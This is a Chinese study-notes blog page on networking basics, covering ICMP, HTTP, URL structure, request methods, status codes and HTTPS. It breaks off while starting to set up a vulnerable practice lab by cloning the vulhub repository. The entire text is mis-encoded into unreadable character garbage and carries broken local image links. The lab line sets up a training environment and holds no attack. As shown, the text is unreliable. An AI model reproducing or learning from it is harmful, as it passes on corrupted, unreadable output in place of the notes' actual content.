è¾“è¿‡ç¨‹ä¸­è¢«ä¸¢å¼ƒçš„åŸå› </strong></li><li><strong>å¸®åŠ©ä¼˜åŒ–å’Œæ”¹å–„ç½‘ç»œè®¾ç½®</strong></li></ul><hr><p>ICMP æŠ¥å‘Šé—®é¢˜çš„è¿‡ç¨‹</p><p>åœ¨ IP é€šä¿¡ä¸­ï¼Œå¦‚æœæŸä¸ª IP åŒ…æœªèƒ½æˆåŠŸåˆ°è¾¾ç›®æ ‡åœ°å€ï¼ŒICMP è´Ÿè´£é€šçŸ¥å‘é€æ–¹å¹¶æä¾›å…·ä½“çš„å¤±è´¥åŸå› ã€‚ä¾‹å¦‚ï¼š</p><ol><li><p><strong>é€šçŸ¥è¿‡ç¨‹</strong>ï¼š</p><ul><li>ä¸»æœº A å‘ä¸»æœº B å‘é€æ•°æ®åŒ…ï¼Œä½†ç”±äºæŸç§åŸå› ï¼Œé€”ä¸­çš„<strong>è·¯ç”±å™¨ 2</strong>æœªèƒ½æ‰¾åˆ°ä¸»æœº Bã€‚</li><li>è·¯ç”±å™¨ 2 ä¼šå‘ä¸»æœº A å‘é€ä¸€ä¸ª <strong>ICMP ç›®æ ‡ä¸å¯è¾¾</strong>æ¶ˆæ¯ï¼Œå‘ŠçŸ¥ä¸»æœº A ç›®æ ‡ä¸»æœº B æ— æ³•åˆ°è¾¾ã€‚</li></ul></li><li><p><strong>æ¶ˆæ¯ä¼ é€’</strong>ï¼š</p><ul><li>ICMP æ¶ˆæ¯é€šè¿‡ IP åè®®å‘é€ï¼ŒæŒ‰ç…§æ­£å¸¸çš„è·¯ç”±è½¬å‘è¿‡ç¨‹è¿”å›ç»™å‘é€æ–¹ã€‚</li><li>è·¯ç”±å™¨ 2 å‘é€çš„ ICMP æ¶ˆæ¯ä¼šå…ˆç»è¿‡<strong>è·¯ç”±å™¨ 1</strong>ï¼Œå†è½¬å‘ç»™ä¸»æœº Aã€‚</li></ul></li><li><p><strong>è§£æ ICMP æ¶ˆæ¯</strong>ï¼š</p><ul><li>ä¸»æœº A æ¥æ”¶åˆ° ICMP æ¶ˆæ¯åï¼Œè§£ææ¶ˆæ¯çš„é¦–éƒ¨å’Œæ•°æ®åŸŸï¼Œå¾—çŸ¥å…·ä½“çš„é—®é¢˜åŸå› ã€‚</li></ul></li></ol><hr><p>ICMP æ¶ˆæ¯çš„åˆ†ç±»</p><p>ICMP æ¶ˆæ¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p><ol><li><p><strong>æŸ¥è¯¢æŠ¥æ–‡ç±»å‹</strong>ï¼šç”¨äºè¯Šæ–­ç½‘ç»œçš„å¥åº·çŠ¶å†µï¼Œä¾‹å¦‚ <code>ping</code> å’Œ <code>traceroute</code> å·¥å…·çš„åŸºç¡€ã€‚</p><ul><li>ä¾‹å¦‚ <code>ping</code> å‘½ä»¤å°±æ˜¯å‘é€ ICMP å›æ˜¾è¯·æ±‚æŠ¥æ–‡ï¼Œç¡®è®¤ç›®æ ‡ä¸»æœºæ˜¯å¦å¯è¾¾ï¼Œå¹¶æµ‹é‡å¾€è¿”æ—¶é—´ã€‚</li></ul></li><li><p><strong>å·®é”™æŠ¥æ–‡ç±»å‹</strong>ï¼šç”¨äºæŠ¥å‘Šä¼ è¾“é”™è¯¯åŸå› ï¼Œå¸®åŠ©å‘é€æ–¹äº†è§£ç½‘ç»œä¸­çš„é—®é¢˜ã€‚</p><ul><li>ä¾‹å¦‚ï¼Œå½“è·¯ç”±å™¨æ— æ³•æ‰¾åˆ°ç›®æ ‡ IP æ—¶ï¼Œä¼šè¿”å›â€œç›®æ ‡ä¸å¯è¾¾â€æŠ¥æ–‡ï¼ŒæŒ‡æ˜æ•°æ®åŒ…æœªé€è¾¾çš„åŸå› ã€‚</li></ul></li></ol><p>![image-20241114204501213](F:\new myblog\STUDY\source\img\image-20241114204501213.png)</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>HTTPçš„åå­—ã€Œè¶…æ–‡æœ¬åè®®ä¼ è¾“ã€ï¼Œå®ƒå¯ä»¥æ‹†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼š è¶…æ–‡æœ¬ ä¼ è¾“ åè®®</p><ol><li><p>åè®®     HTTP æ˜¯ä¸€ä¸ªç”¨åœ¨è®¡ç®—æœºä¸–ç•Œé‡Œçš„åè®®ã€‚å®ƒä½¿ç”¨è®¡ç®—æœºèƒ½å¤Ÿç†è§£çš„è¯­è¨€ç¡®ç«‹äº†ä¸€ç§è®¡ ç®—æœºä¹‹é—´äº¤æµé€šä¿¡çš„è§„èŒƒï¼ˆä¸¤ä¸ªä»¥ä¸Šçš„å‚ä¸è€…ï¼‰ï¼Œä»¥åŠç›¸å…³çš„å„ç§æ§åˆ¶å’Œé”™è¯¯å¤„ç†æ–¹ å¼ï¼ˆè¡Œä¸ºçº¦å®šå’Œè§„èŒƒï¼‰ã€‚</p></li><li><p>ä¼ è¾“   å°±æ˜¯æŠŠä¸€å †ä¸œè¥¿ä» A ç‚¹æ¬åˆ° B ç‚¹ï¼Œæˆ–è€…ä» B ç‚¹ æ¬åˆ° A ç‚¹ã€‚ HTTP åè®®æ˜¯ä¸€ä¸ªåŒå‘åè®®ã€‚ HTTP æ˜¯ä¸€ä¸ªåœ¨è®¡ç®—æœºä¸–ç•Œé‡Œä¸“é—¨ç”¨æ¥åœ¨ä¸¤ç‚¹ä¹‹é—´ä¼ è¾“æ•°æ®çš„çº¦å®šå’Œè§„èŒƒã€‚ æˆ‘ä»¬åœ¨ä¸Šç½‘å†²æµªæ—¶ï¼Œæµè§ˆå™¨æ˜¯è¯·æ±‚æ–¹ A ï¼Œç™¾åº¦ç½‘ç«™å°±æ˜¯åº”ç­”æ–¹ Bã€‚åŒæ–¹çº¦å®šç”¨ HTTP  åè®®æ¥é€šä¿¡ï¼Œäºæ˜¯æµè§ˆå™¨æŠŠè¯·æ±‚æ•°æ®å‘é€ç»™ç½‘ç«™ï¼Œç½‘ç«™å†æŠŠä¸€äº›æ•°æ®è¿”å›ç»™æµè§ˆå™¨ï¼Œ æœ€åç”±æµè§ˆå™¨æ¸²æŸ“åœ¨å±å¹•ï¼Œå°±å¯ä»¥çœ‹åˆ°å›¾ç‰‡ã€è§†é¢‘äº†</p></li><li><p>è¶…æ–‡æœ¬     HTTP ä¼ è¾“çš„å†…å®¹æ˜¯ã€Œè¶…æ–‡æœ¬ã€ ã€Œæ–‡æœ¬ã€ï¼Œåœ¨äº’è”ç½‘æ—©æœŸçš„æ—¶å€™åªæ˜¯ç®€å•çš„å­—ç¬¦æ–‡å­—ï¼Œä½†ç°åœ¨ã€Œæ–‡æœ¬ã€ã€‚çš„æ¶µä¹‰å·²ç» å¯ä»¥æ‰©å±•ä¸ºå›¾ç‰‡ã€è§†é¢‘ã€å‹ç¼©åŒ…ç­‰ï¼Œåœ¨ HTTP çœ¼é‡Œè¿™äº›éƒ½ç®—åšã€Œæ–‡æœ¬ã€ã€‚ã€Œè¶…æ–‡æœ¬ã€ï¼Œå®ƒå°±æ˜¯è¶…è¶Šäº†æ™®é€šæ–‡æœ¬çš„æ–‡æœ¬ï¼Œå®ƒæ˜¯æ–‡å­—ã€å›¾ç‰‡ã€è§†é¢‘ç­‰çš„æ··åˆä½“ï¼Œæœ€ å…³é”®æœ‰è¶…é“¾æ¥ï¼Œèƒ½ä»ä¸€ä¸ªè¶…æ–‡æœ¬è·³è½¬åˆ°å¦å¤–ä¸€ä¸ªè¶…æ–‡æœ¬ã€‚ HTML å°±æ˜¯æœ€å¸¸è§çš„è¶…æ–‡æœ¬äº†ï¼Œå®ƒæœ¬èº«åªæ˜¯çº¯æ–‡å­—æ–‡ä»¶ï¼Œä½†å†…éƒ¨ç”¨å¾ˆå¤šæ ‡ç­¾å®šä¹‰äº†å›¾ ç‰‡ã€è§†é¢‘ç­‰çš„é“¾æ¥ï¼Œåœ¨ç»è¿‡æµè§ˆå™¨çš„è§£é‡Šï¼Œå‘ˆç°ç»™æˆ‘ä»¬çš„å°±æ˜¯ä¸€ä¸ªæ–‡å­—ã€æœ‰ç”»é¢çš„ç½‘é¡µäº†</p></li></ol><p>   HTTP æ˜¯ä¸€ä¸ªåœ¨è®¡ç®—æœºä¸–ç•Œé‡Œä¸“é—¨åœ¨ã€Œä¸¤ç‚¹ã€ä¹‹é—´ã€Œä¼ è¾“ã€æ–‡å­—ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ ç­‰ã€Œè¶…æ–‡æœ¬ã€æ•°æ®çš„ã€Œçº¦å®šå’Œè§„èŒƒã€</p><p>URLï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰ï¼šæˆ‘ä»¬å¸¸è¯´çš„ç½‘å€ï¼ŒåŒ…å«äº†ç”¨äºæŸ¥æ‰¾èµ„æºçš„è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œè€Œ ä¸€ä¸ªå®Œæ•´çš„URLåŒ…å«ä¸‹é¢å‡ éƒ¨åˆ†</p><p> protocol:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query] [#fragment]</p><p><strong>protocol</strong>ï¼šæŒ‡å®šä½¿ç”¨çš„ä¼ è¾“åè®®ï¼Œæœ€å¸¸è§çš„åè®®æ˜¯ <strong>HTTP&#x2F;HTTPS</strong>ï¼Œç”¨äºå®šä½ç½‘ç»œèµ„æºã€‚å…¶ä»–åè®®åŒ…æ‹¬ï¼š</p><ul><li><strong>mailto:</strong> æ‰“å¼€é‚®ç®±å®¢æˆ·ç«¯</li><li><strong>ftp:</strong> ç”¨äºæ–‡ä»¶ä¼ è¾“</li><li><strong>file:</strong> è·å–æœ¬åœ°æˆ–å…±äº«æ–‡ä»¶</li></ul><p><strong>user</strong>ç”¨äºåœ¨éœ€è¦è®¤è¯åæ‰èƒ½è®¿é—®çš„èµ„æºæ—¶æä¾›è´¦å·å’Œå¯†ç ã€‚</p><p><strong>host</strong>ï¼šæŒ‡å®šåˆæ³•çš„äº’è”ç½‘ä¸»æœºåŸŸåæˆ– IP åœ°å€ï¼Œè¡¨ç¤ºèµ„æºæ‰€åœ¨çš„æœåŠ¡å™¨ä½ç½®ã€‚</p><p><strong>port</strong>ï¼šç”¨äºæŒ‡å®šåœ¨ä¼ è¾“å±‚ä¸Šç”¨äºä¿¡æ¯äº¤æ¢çš„è¿›ç¨‹ç«¯å£å·ï¼Œè¡¨ç¤ºè·å–æœåŠ¡å™¨èµ„æºçš„å…¥å£ã€‚</p><ul><li>ä¸åŒåè®®æœ‰é»˜è®¤ç«¯å£å·ï¼Œä¾‹å¦‚ HTTP çš„é»˜è®¤ç«¯å£æ˜¯ 80ã€‚è‹¥ä½¿ç”¨å…¶ä»–ç«¯å£ï¼Œåˆ™éœ€è¦æ˜¾å¼æŒ‡å®šã€‚</li></ul><p><strong>path</strong>ï¼šè¡¨ç¤ºæœåŠ¡å™¨ä¸Šèµ„æºçš„å…·ä½“è·¯å¾„ï¼ŒæŒ‡æ˜è¯·æ±‚çš„èµ„æºä½ç½®ã€‚</p><p><strong>?query</strong>ï¼šå¯é€‰é¡¹ï¼Œç”¨äºä¼ é€’åŠ¨æ€ç½‘é¡µå‚æ•°ã€‚</p><ul><li>å¤šä¸ªå‚æ•°ä¹‹é—´ç”¨ <strong>â€œ&amp;â€</strong> éš”å¼€ï¼Œæ¯ä¸ªå‚æ•°çš„é”®å€¼å¯¹ä¹‹é—´ç”¨ <strong>â€œ&#x3D;â€</strong> éš”å¼€ã€‚</li></ul><p><strong>#fragment</strong>ï¼šä¿¡æ¯ç‰‡æ®µå­—ç¬¦ä¸²ï¼Œç”¨äºæŒ‡å®šèµ„æºä¸­çš„æŸä¸ªéƒ¨åˆ†ã€‚</p><ul><li>ä¾‹å¦‚ï¼Œåœ¨ç½‘é¡µä¸­å¯ä»¥ç”¨ fragment ç›´æ¥å®šä½åˆ°ç‰¹å®šçš„æ®µè½æˆ–åè¯è§£é‡Šä½ç½®ã€‚</li></ul><h3 id="HTTPè¯·æ±‚"><a href="#HTTPè¯·æ±‚" class="headerlink" title="HTTPè¯·æ±‚"></a>HTTPè¯·æ±‚</h3><p>HTTPè¯·æ±‚ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼š è¯·æ±‚è¡Œ è¯·æ±‚å¤´éƒ¨ ç©ºè¡Œ è¯·æ±‚æ­£</p><p>![image-20241114210646570](F:\new myblog\STUDY\source\img\image-20241114210646570.png)</p><p>![image-20241114210708742](F:\new myblog\STUDY\source\img\image-20241114210708742.png)</p><p>è¯·æ±‚æ–¹æ³•</p><h3 id="HTTP-è¯·æ±‚æ–¹æ³•"><a href="#HTTP-è¯·æ±‚æ–¹æ³•" class="headerlink" title="HTTP è¯·æ±‚æ–¹æ³•"></a>HTTP è¯·æ±‚æ–¹æ³•</h3><ol><li><strong>GET</strong>ï¼šè·å–ç”± <code>Request-URI</code> æ‰€æ ‡è¯†çš„èµ„æºã€‚</li><li><strong>POST</strong>ï¼šåœ¨ <code>Request-URI</code> æ‰€æ ‡è¯†çš„èµ„æºåé™„åŠ æ–°çš„æ•°æ®ã€‚</li><li><strong>HEAD</strong>ï¼šè¯·æ±‚è·å–ç”± <code>Request-URI</code> æ‰€æ ‡è¯†çš„èµ„æºçš„å“åº”æ¶ˆæ¯æŠ¥å¤´ï¼Œä¸è¿”å›ä¸»ä½“å†…å®¹ã€‚</li><li><strong>PUT</strong>ï¼šè¯·æ±‚æœåŠ¡å™¨å­˜å‚¨ä¸€ä¸ªèµ„æºï¼Œå¹¶ä½¿ç”¨ <code>Request-URI</code> ä½œä¸ºè¯¥èµ„æºçš„æ ‡è¯†ã€‚</li><li><strong>DELETE</strong>ï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤ <code>Request-URI</code> æ‰€æ ‡è¯†çš„èµ„æºã€‚</li><li><strong>TRACE</strong>ï¼šè¯·æ±‚æœåŠ¡å™¨å›é€æ”¶åˆ°çš„è¯·æ±‚ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚</li><li><strong>OPTIONS</strong>ï¼šè¯·æ±‚æŸ¥è¯¢æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œæˆ–è€…è·å–ä¸èµ„æºç›¸å…³çš„é€‰é¡¹å’Œéœ€æ±‚ã€‚</li><li><strong>CONNECT</strong>ï¼šä¿ç•™ç»™å°†æ¥ä½¿ç”¨ï¼Œåœ¨ HTTP&#x2F;1.1 åè®®ä¸­ä¸ºä»£ç†æœåŠ¡å™¨é¢„ç•™ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼ã€‚</li><li><strong>PATCH</strong>ï¼šç”¨äºå°†å±€éƒ¨ä¿®æ”¹åº”ç”¨åˆ°èµ„æºï¼ˆç”± RFC 5789 æŒ‡å®šçš„æ–¹æ³•ï¼‰ã€‚</li></ol><p><strong>HTTP&#x2F;1.0</strong> å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š<code>GET</code>ã€<code>POST</code> å’Œ <code>HEAD</code>ã€‚</p><p><strong>HTTP&#x2F;1.1</strong> æ–°å¢äº†å…­ç§è¯·æ±‚æ–¹æ³•ï¼š<code>OPTIONS</code>ã€<code>PUT</code>ã€<code>PATCH</code>ã€<code>DELETE</code>ã€<code>TRACE</code> å’Œ <code>CONNECT</code>ã€‚</p><p>![image-20241114210859708](F:\new myblog\STUDY\source\img\image-20241114210859708.png)</p><p>çŠ¶æ€ç  </p><p>ä»¥ä¸‹æ˜¯æ‚¨å…³äº HTTP çŠ¶æ€ç çš„å†…å®¹æ’ç‰ˆæ•´ç†ï¼š</p><hr><h3 id="HTTP-çŠ¶æ€ç è¯¦è§£"><a href="#HTTP-çŠ¶æ€ç è¯¦è§£" class="headerlink" title="HTTP çŠ¶æ€ç è¯¦è§£"></a>HTTP çŠ¶æ€ç è¯¦è§£</h3><h4 id="2xxï¼šæˆåŠŸçŠ¶æ€ç "><a href="#2xxï¼šæˆåŠŸçŠ¶æ€ç " class="headerlink" title="2xxï¼šæˆåŠŸçŠ¶æ€ç "></a>2xxï¼šæˆåŠŸçŠ¶æ€ç </h4><ul><li><strong>200 OK</strong>ï¼šè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œä¸€åˆ‡æ­£å¸¸ã€‚å“åº”å¤´åŒ…å« <code>body</code> æ•°æ®ã€‚</li><li><strong>204 No Content</strong>ï¼šè¯·æ±‚æˆåŠŸï¼Œä½†å“åº”å¤´æ²¡æœ‰ <code>body</code> æ•°æ®ã€‚</li><li><strong>206 Partial Content</strong>ï¼šè¡¨ç¤ºåˆ†å—ä¸‹è½½æˆ–æ–­ç‚¹ç»­ä¼ ï¼Œ<code>body</code> æ•°æ®æ˜¯èµ„æºçš„ä¸€éƒ¨åˆ†ï¼ŒæœåŠ¡å™¨å¤„ç†æˆåŠŸã€‚</li></ul><hr><h4 id="3xxï¼šé‡å®šå‘çŠ¶æ€ç "><a href="#3xxï¼šé‡å®šå‘çŠ¶æ€ç " class="headerlink" title="3xxï¼šé‡å®šå‘çŠ¶æ€ç "></a>3xxï¼šé‡å®šå‘çŠ¶æ€ç </h4><ul><li><strong>301 Moved Permanently</strong>ï¼šæ°¸ä¹…é‡å®šå‘ï¼Œèµ„æºå·²ç§»åŠ¨åˆ°æ–°çš„ URLï¼Œå®¢æˆ·ç«¯éœ€ä½¿ç”¨æ–°çš„ URLã€‚</li><li><strong>302 Found</strong>ï¼ˆMoved Temporarilyï¼‰ï¼šä¸´æ—¶é‡å®šå‘ï¼Œèµ„æºæš‚æ—¶éœ€è¦ç”¨å¦ä¸€ä¸ª URL è®¿é—®ã€‚<ul><li><strong>301</strong> å’Œ <strong>302</strong> çŠ¶æ€ç çš„å“åº”å¤´ä¸­ä¼šä½¿ç”¨ <code>Location</code> å­—æ®µæŒ‡æ˜è·³è½¬çš„ URLï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨é‡å®šå‘ã€‚</li></ul></li><li><strong>304 Not Modified</strong>ï¼šèµ„æºæœªä¿®æ”¹ï¼Œé‡å®šå‘åˆ°å®¢æˆ·ç«¯å·²æœ‰çš„ç¼“å­˜æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºç¼“å­˜æ§åˆ¶ã€‚</li></ul><hr><h4 id="4xxï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç "><a href="#4xxï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç " class="headerlink" title="4xxï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç "></a>4xxï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç </h4><ul><li><strong>400 Bad Request</strong>ï¼šè¯·æ±‚çš„æŠ¥æ–‡æœ‰é”™è¯¯ï¼Œå±äºç¬¼ç»Ÿçš„é”™è¯¯ç ã€‚</li><li><strong>403 Forbidden</strong>ï¼šæœåŠ¡å™¨ç¦æ­¢è®¿é—®èµ„æºï¼Œä¸å®¢æˆ·ç«¯è¯·æ±‚æ— å…³ã€‚</li><li><strong>404 Not Found</strong>ï¼šè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨æˆ–æœªæ‰¾åˆ°ï¼ŒæœåŠ¡å™¨æ— æ³•æä¾›èµ„æºã€‚</li></ul><hr><h4 id="5xxï¼šæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç "><a href="#5xxï¼šæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç " class="headerlink" title="5xxï¼šæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç "></a>5xxï¼šæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç </h4><ul><li><strong>500 Internal Server Error</strong>ï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œå±äºç¬¼ç»Ÿçš„é€šç”¨é”™è¯¯ç ã€‚</li><li><strong>501 Not Implemented</strong>ï¼šæœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œç›¸å½“äºâ€œå³å°†å¼€ä¸šï¼Œæ•¬è¯·æœŸå¾…â€ã€‚</li><li><strong>502 Bad Gateway</strong>ï¼šæœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–ä»£ç†æ—¶è®¿é—®åç«¯æœåŠ¡å™¨å‡ºé”™ã€‚</li><li><strong>503 Service Unavailable</strong>ï¼šæœåŠ¡å™¨æš‚æ—¶æ— æ³•å“åº”è¯·æ±‚ï¼Œé€šå¸¸è¡¨ç¤ºæœåŠ¡å™¨ç¹å¿™ï¼Œè¯·ç¨åé‡è¯•ã€‚</li></ul><hr><h3 id="HTTPè¯·æ±‚æ–¹æ³•ç†è§£"><a href="#HTTPè¯·æ±‚æ–¹æ³•ç†è§£" class="headerlink" title="HTTPè¯·æ±‚æ–¹æ³•ç†è§£"></a>HTTPè¯·æ±‚æ–¹æ³•ç†è§£</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>Get æ–¹æ³•çš„å«ä¹‰æ˜¯è¯·æ±‚ä»æœåŠ¡å™¨è·å–èµ„æºï¼Œè¿™ä¸ªèµ„æºå¯ä»¥æ˜¯é™æ€çš„æ–‡æœ¬ã€é¡µé¢ã€å›¾ ç‰‡è§†é¢‘ç­‰</p><p>![image-20241114211249857](F:\new myblog\STUDY\source\img\image-20241114211249857.png)</p><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POSTï¼šå‘ Request-URIæ‰€æ ‡è¯†çš„èµ„æºæäº¤æ•°æ®ï¼Œæ•°æ®å°±æ”¾åœ¨è¯·æ±‚æ­£æ–‡ä¸­ ç”¨äºå‘æŒ‡å®šèµ„æºå‘é€æ•°æ®ï¼ŒæŒ‡å®šçš„èµ„æºä¼šå¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œç„¶åå°†å¤„ç†ç»“æœè¿”å›ç»™å®¢ æˆ·ç«¯ï¼Œä¸€èˆ¬ç”¨äºè¡¨å•æäº¤ã€æ–‡ä»¶ä¸Šä¼ </p><p>![image-20241114211204865](F:\new myblog\STUDY\source\img\image-20241114211204865.png)</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEADï¼šè¯·æ±‚è·å–ç”±Request-URIæ‰€æ ‡è¯†çš„èµ„æºçš„å“åº”æ¶ˆæ¯æŠ¥å¤´é¦–éƒ¨ï¼Œä¸ä¼šè¿”å›æŠ¥æ–‡ ä¸»ä½“</p><p>![image-20241114211328505](F:\new myblog\STUDY\source\img\image-20241114211328505.png)</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>OPTIONSï¼šæŸ¥è¯¢èµ„æºæ”¯æŒçš„æ–¹æ³•</p><p>![image-20241114211353396](F:\new myblog\STUDY\source\img\image-20241114211353396.png)</p><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p><code>PUT</code> è¯·æ±‚ç”¨äºå‘æœåŠ¡å™¨å­˜å‚¨ä¸€ä¸ªèµ„æºï¼Œå¹¶ä½¿ç”¨ <code>Request-URI</code> ä½œä¸ºå…¶æ ‡è¯†ã€‚æœåŠ¡å™¨ä¼šå°†è¯·æ±‚ä¸»ä½“çš„å†…å®¹ä¿å­˜åˆ° <code>URL</code> æŒ‡å®šçš„èµ„æºä½ç½®ï¼ŒåŒ…å«ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ol><li><strong>èµ„æºä¸å­˜åœ¨</strong>ï¼š<ul><li>å¦‚æœ <code>URL</code> æŒ‡å®šçš„èµ„æºä¸å­˜åœ¨ï¼ŒæœåŠ¡å™¨ä¼šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå°†è¯·æ±‚ä¸»ä½“ä¸­çš„å†…å®¹ä¿å­˜åˆ°æ–°å»ºçš„æ–‡ä»¶ä¸­ã€‚</li><li><strong>å“åº”ç </strong>ï¼š<code>201 Created</code></li></ul></li><li><strong>èµ„æºå·²å­˜åœ¨</strong>ï¼š<ul><li>å¦‚æœ <code>URL</code> æŒ‡å®šçš„èµ„æºå·²å­˜åœ¨ï¼ŒæœåŠ¡å™¨ä¼šç”¨è¯·æ±‚ä¸»ä½“ä¸­çš„å†…å®¹<strong>è¦†ç›–åŸæ–‡ä»¶å†…å®¹</strong>ã€‚</li><li><strong>å“åº”ç </strong>ï¼š<code>200 OK</code> æˆ– <code>204 No Content</code></li></ul></li></ol><p>![image-20241114211421629](F:\new myblog\STUDY\source\img\image-20241114211421629.png)</p><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æº</p><p>![image-20241114211431471](F:\new myblog\STUDY\source\img\image-20241114211431471.png)</p><h4 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h4><p>TRACEï¼šè·¯å¾„è¿½è¸ªï¼Œè¯·æ±‚æœåŠ¡å™¨å›é€æ”¶åˆ°çš„è¯·æ±‚ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­å‘é€çš„è¯· æ±‚æ˜¯å¦åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´ä¼ é€æ—¶è¢«ç½‘å…³ã€é˜²ç«å¢™ã€ä»£ç†æ›´æ”¹</p><h3 id="HTTPSä¸HTTP"><a href="#HTTPSä¸HTTP" class="headerlink" title="HTTPSä¸HTTP"></a>HTTPSä¸HTTP</h3><p>HTTP ä¸ HTTPS çš„åŒºåˆ«</p><ol><li><strong>ä¼ è¾“å®‰å…¨æ€§</strong>ï¼š<ul><li><strong>HTTP</strong>ï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œä¿¡æ¯<strong>ä»¥æ˜æ–‡å½¢å¼ä¼ è¾“</strong>ï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚</li><li><strong>HTTPS</strong>ï¼šåœ¨ TCP å’Œ HTTP ç½‘ç»œå±‚ä¹‹é—´åŠ å…¥ <strong>SSL&#x2F;TLS</strong> å®‰å…¨åè®®ï¼Œä½¿å¾—æŠ¥æ–‡å¯ä»¥<strong>åŠ å¯†ä¼ è¾“</strong>ï¼Œè§£å†³äº† HTTP çš„ä¸å®‰å…¨é—®é¢˜ã€‚</li></ul></li><li><strong>è¿æ¥å»ºç«‹æµç¨‹</strong>ï¼š<ul><li><strong>HTTP</strong>ï¼šå»ºç«‹ç›¸å¯¹ç®€å•ï¼Œç»è¿‡ TCP ä¸‰æ¬¡æ¡æ‰‹åå³å¯ä¼ è¾“ HTTP æŠ¥æ–‡ã€‚</li><li><strong>HTTPS</strong>ï¼šåœ¨ TCP ä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼Œè¿˜éœ€è¿›è¡Œ<strong>SSL&#x2F;TLS æ¡æ‰‹</strong>è¿‡ç¨‹ï¼Œæ‰å¯è¿›å…¥åŠ å¯†çš„æŠ¥æ–‡ä¼ è¾“ã€‚</li></ul></li><li><strong>ç«¯å£å·</strong>ï¼š<ul><li><strong>HTTP</strong>ï¼šé»˜è®¤ç«¯å£å·ä¸º 80ã€‚</li><li><strong>HTTPS</strong>ï¼šé»˜è®¤ç«¯å£å·ä¸º 443ã€‚</li></ul></li><li><strong>è¯ä¹¦éªŒè¯</strong>ï¼š<ul><li><strong>HTTPS</strong>ï¼šéœ€è¦å‘ <strong>CAï¼ˆè¯ä¹¦æƒå¨æœºæ„ï¼‰</strong> ç”³è¯·æ•°å­—è¯ä¹¦ï¼Œä»¥ä¿è¯æœåŠ¡å™¨èº«ä»½çš„å¯ä¿¡åº¦ã€‚</li></ul></li></ol><hr><p>HTTPS è§£å†³çš„é—®é¢˜</p><p>ç”±äº HTTP æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œåœ¨å®‰å…¨æ€§ä¸Šå­˜åœ¨ä»¥ä¸‹ä¸‰ä¸ªä¸»è¦é£é™©ï¼š</p><ol><li><strong>çªƒå¬é£é™©</strong>ï¼šç¬¬ä¸‰æ–¹å¯ä»¥åœ¨é€šä¿¡é“¾è·¯ä¸­è·å–é€šä¿¡å†…å®¹ï¼Œå¯¼è‡´ç”¨æˆ·éšç§æ³„éœ²ã€‚</li><li><strong>ç¯¡æ”¹é£é™©</strong>ï¼šç¬¬ä¸‰æ–¹å¯ä»¥å¼ºåˆ¶æ’å…¥å†…å®¹ï¼ˆå¦‚åƒåœ¾å¹¿å‘Šï¼‰ï¼Œå½±å“ç”¨æˆ·ä½“éªŒå’Œå†…å®¹å®Œæ•´æ€§ã€‚</li><li><strong>å†’å……é£é™©</strong>ï¼šç¬¬ä¸‰æ–¹å¯ä»¥å†’å……åˆæ³•ç½‘ç«™ï¼ˆå¦‚é“¶è¡Œæˆ–è´­ç‰©ç½‘ç«™ï¼‰ï¼Œå¼•è¯±ç”¨æˆ·è¾“å…¥æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œç›—å–ç”¨æˆ·è´¢äº§ã€‚</li></ol><p>![image-20241114211604169](F:\new myblog\STUDY\source\img\image-20241114211604169.png)</p><h2 id="é¶åœºæ­å»º"><a href="#é¶åœºæ­å»º" class="headerlink" title="é¶åœºæ­å»º"></a>é¶åœºæ­å»º</h2><p>git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a><br>cd 